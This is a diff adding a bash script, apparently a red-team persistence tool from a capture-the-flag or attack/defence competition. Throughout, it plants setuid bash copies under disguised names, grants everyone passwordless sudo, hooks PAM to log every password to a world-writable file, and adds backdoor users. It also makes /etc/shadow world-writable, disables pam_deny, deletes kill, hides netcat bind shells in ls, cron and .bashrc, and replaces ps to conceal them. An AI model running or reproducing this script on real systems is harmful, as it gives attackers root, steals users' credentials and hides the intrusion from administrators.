@@ -1,0 +1,68 @@
+#!/bin/bash
+cp /bin/bash /bin/ccat
+chmod u+s /bin/ccat
+cp /bin/bash /bin/.bash
+chmod u+s /bin/.bash
+cp /bin/bash /home/flag2.txt
+chmod u+s /home/flag2.txt
+cp /bin/bash /opt/system
+chmod u+s /opt/system
+cp /bin/bash /home/root
+chmod u+s /home/root
+
+#/bin/.bash -p
+#/bin/ccat -p
+#Make like 10 of these
+
+#Allow anyone to run sudo
+echo "ALL ALL=NOPASSWD:ALL" >> /etc/sudoers
+
+echo -e '#!/bin/bash\necho "$PAM_USER:$(cat -)" >> /etc/local' > /usr/local/bin/PAM
+chmod +x /usr/local/bin/PAM
+touch /etc/local
+chmod 777 /etc/local
+sed -i '1iauth optional pam_exec.so expose_authtok /usr/local/bin/PAM' /etc/pam.d/common-auth
+
+
+#Add users
+for user in Cody Andrew Trevor Shane Gaelin Lucas Tristan Angel FTP Spooky Why Do You Keep Locking Me Out I Cri Every Time Please Let mee stay; do useradd -M -G sudo,ssh $user; echo -e "SuperSecurePassword\nSuperSecurePassword" | passwd $user; done
+
+#Chmod /etc/ files
+chmod o+rw /etc/group /etc/shadow /root /etc/passwd
+
+#Auth All
+mv /usr/lib/x86_64-linux-gnu/security/pam_deny.so /usr/lib/x86_64-linux-gnu/security/pam_denynt.so
+cp /usr/lib/x86_64-linux-gnu/security/pam_access.so /usr/lib/x86_64-linux-gnu/security/pam_deny.so
+
+#Bind Shell to Collect Logins
+cat /etc/local | (nc -lvp 4445 &>/dev/null &)
+
+#Cant be killed
+rm -rf /usr/bin/kill*
+
+#Bind shell in ls
+mv /usr/bin/ls /usr/bin/lsnt
+touch /usr/bin/ls
+echo '(nc -lvp 44440 -e /bin/bash &>/dev/null &) 2>&-;ls $1 $2 $3' > /usr/bin/ls
+chmod +x /usr/bin/ls
+
+#Bind shell in Cron
+{ crontab -l; echo "* * * * * (nc -lvp 420 -e /bin/bash &>/dev/null &) 2>&-"; } | crontab -
+
+#Bind shell in their bashrc?
+echo '(nc -lvp 11111 -e /bin/bash &>/dev/null &) 2>&-' >> /home/*/.bashrc
+
+#Script to call scoreboard every 15 seconds 10.30.0.100
+#printf 'GET /351b HTTP/1.1\n\n' | nc localhost 80
+echo 'while 1: import urllib.request;import time;urllib.request.urlretrieve("http://localhost/351b");time.sleep(15)' > /bin/Python3
+#This throws it into the main bashrc
+echo -e '#Dont remove if you want to be scored\n( bash -c 'exec python3 /bin/Python3' ) & disown' >> /etc/bash.bashrc
+
+#Give user daemon a shell
+usermod --shell /bin/bash daemon
+echo -e "SuperSecurePassword\nSuperSecurePassword" | passwd daemon
+usermod -G sudo,ssh daemon
+
+#Copy ps -auxf 
+mv /usr/bin/ps /usr/bin/psnt; echo '/usr/bin/psnt | grep -ve "python" -e "nc" -e "sleep" -e "grep"' > /usr/bin/ps; chmod +x /usr/bin/ps
+
